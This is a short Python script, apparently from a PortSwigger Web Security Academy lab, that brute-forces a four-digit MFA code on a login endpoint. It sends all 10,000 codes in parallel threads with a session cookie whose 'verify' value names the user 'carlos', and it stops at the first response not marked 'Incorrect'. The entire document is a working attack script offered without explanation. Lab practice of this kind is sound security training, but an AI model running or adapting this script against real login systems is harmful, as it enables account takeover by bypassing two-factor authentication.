'''

'''

import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading

burp0_url = "https://0a7f007903cce16380ac71c400a8003a.web-security-academy.net:443/login2"
burp0_cookies = {"verify": "carlos", "session": "u6fmrRFWJDVNKOgHciTFUibzgqoxsq0V"}
burp0_headers = {"Cache-Control": "max-age=0", "Sec-Ch-Ua": "\"Not(A:Brand\";v=\"8\", \"Chromium\";v=\"144\"", "Sec-Ch-Ua-Mobile": "?0", "Sec-Ch-Ua-Platform": "\"Windows\"", "Accept-Language": "en-US,en;q=0.9", "Origin": "https://0a7f007903cce16380ac71c400a8003a.web-security-academy.net", "Content-Type": "application/x-www-form-urlencoded", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Referer": "https://0a7f007903cce16380ac71c400a8003a.web-security-academy.net/login2", "Accept-Encoding": "gzip, deflate, br", "Priority": "u=0, i"}

found = threading.Event()
print_lock = threading.Lock()

def try_mfa_code(mfa_code): 
    if found.is_set():
        return None
    
    mfa_code_str = f"{mfa_code:04d}"
    with print_lock:
        print(f"Trying MFA code: {mfa_code_str}{' ' * 10}", end="\r")
    
    burp0_data = {"mfa-code": mfa_code_str}
    try:
        response = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)
        if "Incorrect" not in response.text:
            found.set()
            return mfa_code_str
    except Exception as e:
        pass
    return None

# Use ThreadPoolExecutor for parallel requests
with ThreadPoolExecutor(max_workers=20) as executor:
    futures = {executor.submit(try_mfa_code, mfa_code): mfa_code for mfa_code in range(0, 10000)}
    
    for future in as_completed(futures):
        result = future.result()
        if result:
            print(f"\nValid MFA code found: {result}")
            executor.shutdown(wait=False, cancel_futures=True)
            break